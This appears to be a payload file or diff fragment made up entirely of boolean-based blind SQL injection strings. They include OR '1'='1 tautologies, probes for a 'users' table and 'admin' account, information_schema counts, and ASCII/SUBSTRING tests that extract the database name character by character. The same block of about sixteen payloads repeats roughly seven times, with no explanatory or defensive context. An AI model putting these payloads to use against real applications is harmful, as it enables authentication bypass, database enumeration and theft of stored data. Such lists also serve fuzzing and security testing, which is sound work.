+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
